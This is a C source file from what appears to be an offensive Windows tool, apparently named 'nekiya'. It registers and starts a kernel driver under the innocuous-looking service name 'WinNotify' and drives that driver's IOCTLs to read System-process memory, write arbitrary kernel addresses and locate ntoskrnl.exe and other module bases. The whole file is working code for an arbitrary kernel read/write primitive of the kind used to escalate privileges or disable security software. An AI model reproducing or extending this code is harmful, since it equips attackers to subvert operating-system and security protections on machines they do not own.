#include "ft.h"
#include "lsapi.h"

#include <string.h>

#define FT_SYS_PID 4u

static int ft_svc_start(const char* service) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE svc;
    BOOL ok;

    if (!scm) return 0;
    svc = OpenServiceA(scm, service, SERVICE_START | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 0; }
    ok = StartServiceA(svc, 0, NULL);
    if (!ok && GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) ok = TRUE;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok ? 1 : 0;
}

static void ft_svc_stop(const char* service) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE svc;
    SERVICE_STATUS ss;
    DWORD wait;

    if (!scm) return;
    svc = OpenServiceA(scm, service, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return; }
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    for (wait = 0; wait < 50; wait++) {
        if (!QueryServiceStatus(svc, &ss)) break;
        if (ss.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(100);
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

int ft_km_load_driver(ft_ctx* c, const char* path, const char* service) {
    SC_HANDLE scm;
    SC_HANDLE svc;
    BOOL ok;

    (void)c;
    if (!path || !*path || !service || !*service) return 0;
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "nekiya: driver file not found: %s\n", path);
        return 0;
    }
    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        fprintf(stderr, "nekiya: OpenSCManager failed (%lu)\n", GetLastError());
        return 0;
    }
    svc = OpenServiceA(scm, service, SERVICE_START | SERVICE_QUERY_STATUS);
    if (!svc) {
        svc = CreateServiceA(scm, service, service,
                             SERVICE_START | SERVICE_QUERY_STATUS | DELETE,
                             SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                             SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL);
        if (!svc) {
            fprintf(stderr, "nekiya: CreateService(%s) failed (%lu)\n",
                    service, GetLastError());
            CloseServiceHandle(scm);
            return 0;
        }
    }
    ok = StartServiceA(svc, 0, NULL);
    if (!ok && GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) ok = TRUE;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok ? 1 : 0;
}

static int ft_km_try_open(HANDLE* out) {
    HANDLE h = CreateFileW(L"\\\\.\\WinNotify",
                            GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    if (out) *out = h;
    else CloseHandle(h);
    return 1;
}

int ft_km_open(ft_ctx* c) {
    static const char* svc = "WinNotify";
    int i;

    if (!c) return 0;
    if (c->km_ready) return 1;

    if (ft_km_try_open(&c->dev)) {
        c->km_ready = 1;
        return 1;
    }

    if (ft_svc_start(svc)) {
        Sleep(300);
        if (ft_km_try_open(&c->dev)) {
            c->km_ready = 1;
            return 1;
        }
    }

    fprintf(stderr, "nekiya: cycling the %s service\n", svc);
    ft_svc_stop(svc);
    Sleep(300);
    if (!ft_km_load_driver(c, c->sys_path, svc)) {
        fprintf(stderr, "nekiya: cannot load %s from %s\n", svc, c->sys_path);
        return 0;
    }
    Sleep(300);

    for (i = 0; i < 3; i++) {
        if (ft_km_try_open(&c->dev)) {
            c->km_ready = 1;
            return 1;
        }
        Sleep(300);
    }
    fprintf(stderr, "nekiya: cannot open \\\\.\\WinNotify (%lu)\n", GetLastError());
    return 0;
}

void ft_km_close(ft_ctx* c) {
    if (!c || !c->km_ready) return;
    CloseHandle(c->dev);
    c->dev = INVALID_HANDLE_VALUE;
    c->km_ready = 0;
}

int ft_is_kernel_ptr(uint64_t v) {

    return (v >= FT_KERN_MIN) ? 1 : 0;
}

static int ft_read_process_mem(ft_ctx* c, uint64_t addr, void* dst, size_t len) {
    WINNOTIFY_READ_PROCESS_MEMORY req;
    DWORD got = 0;

    if (!c || !c->km_ready || !dst || len == 0) return 0;
    if (len > 8) return 0;
    memset(&req, 0, sizeof req);
    req.ProcessId = FT_SYS_PID;
    req.SourceAddress = addr;
    req.TargetAddress = (ULONG64)(uintptr_t)dst;
    req.BufferSize = (SIZE_T)len;
    if (!DeviceIoControl(c->dev, WINNOTIFY_IOCTL_READ_PROCESS_MEMORY,
                         &req, sizeof req, &req, sizeof req, &got, NULL)) {
        return 0;
    }
    return 1;
}

ft_rr ft_km_read_bytes(ft_ctx* c, uint64_t addr, void* dst, size_t len) {
    unsigned char* p = (unsigned char*)dst;
    size_t done = 0;

    if (!c || !c->km_ready || !dst || len == 0) return FTR_FAIL;
    if (addr < 0x1000ull) return FTR_FAIL;
    if (!ft_is_kernel_ptr(addr)) return FTR_FAIL;

    while (done < len) {
        uint64_t a = addr + done;
        size_t room = 8 - (size_t)(a & 0x7);
        size_t take = len - done;

        if (room > 8) room = 8;
        if (take > room) take = room;

        if ((a & 0xFFFULL) + take > 0x1000ULL) {
            take = 0x1000ULL - (a & 0xFFFULL);
            if (take == 0) return FTR_FAIL;
        }
        if (take > 8) take = 8;

        if (!ft_read_process_mem(c, a, p + done, take)) {
            return FTR_FAIL;
        }
        done += take;
    }
    return FTR_VAL;
}

ft_rr ft_km_read64(ft_ctx* c, uint64_t addr, uint64_t* out) {
    if (!out) return FTR_FAIL;
    *out = 0;
    if (!c || !c->km_ready) return FTR_FAIL;
    if (ft_km_read_bytes(c, addr, out, 8) == FTR_VAL) return FTR_VAL;
    *out = 0;
    return FTR_FAIL;
}

ft_rr ft_km_read64_fast(ft_ctx* c, uint64_t addr, uint64_t* out) {
    return ft_km_read64(c, addr, out);
}

ft_rr ft_km_read32(ft_ctx* c, uint64_t addr, uint32_t* out) {
    uint64_t v = 0;
    ft_rr r;
    if (!out) return FTR_FAIL;
    *out = 0;
    r = ft_km_read64(c, addr, &v);
    if (r == FTR_VAL) {
        *out = (uint32_t)(v & 0xFFFFFFFFull);
        return r;
    }
    return FTR_FAIL;
}

int ft_km_write(ft_ctx* c, uint64_t addr, const void* src, size_t len) {
    WINNOTIFY_WRITE_VIRTUAL_MEMORY req;
    DWORD got = 0;
    uint64_t probe = 0;

    if (!c || !c->km_ready || !src || len == 0) return 0;
    if (addr < 0x1000ull) return 0;
    if (!ft_is_kernel_ptr(addr)) return 0;

    if (len > 8) return 0;

    if ((addr & 0xFFFULL) + len > 0x1000ULL) return 0;

    if (!ft_read_process_mem(c, addr, &probe, len)) return 0;

    memset(&req, 0, sizeof req);
    req.Source = (ULONG64)(uintptr_t)src;
    req.Size = (ULONG64)len;
    req.Destination = addr;

    if (!DeviceIoControl(c->dev, WINNOTIFY_IOCTL_WRITE_VIRTUAL_MEMORY,
                          &req, sizeof req, NULL, 0, &got, NULL)) {
        return 0;
    }
    return 1;
}

int ft_km_write64(ft_ctx* c, uint64_t addr, uint64_t val) {
    return ft_km_write(c, addr, &val, 8);
}

int ft_km_module_base(ft_ctx* c, const char* name, uint64_t* base) {
    WINNOTIFY_GET_KERNEL_MODULE_BASE req;
    DWORD got = 0;

    if (!c || !c->km_ready || !name || !base) return 0;
    *base = 0;
    memset(&req, 0, sizeof req);
    req.ModuleName = (PCHAR)name;
    if (!DeviceIoControl(c->dev, WINNOTIFY_IOCTL_GET_KERNEL_MODULE_BASE,
                         &req, (DWORD)offsetof(WINNOTIFY_GET_KERNEL_MODULE_BASE, Unused2),
                         &req, (DWORD)sizeof req, &got, NULL)) {
        return 0;
    }
    if (req.ModuleBaseAddress == 0) return 0;
    if (!ft_is_kernel_ptr((uint64_t)req.ModuleBaseAddress)) return 0;
    *base = (uint64_t)req.ModuleBaseAddress;
    return 1;
}

uint64_t ft_ntos_base(ft_ctx* c) {
    if (!c) return 0;
    if (c->ntos_base == 0) {
        (void)ft_km_module_base(c, "ntoskrnl.exe", &c->ntos_base);
    }
    return c->ntos_base;
}
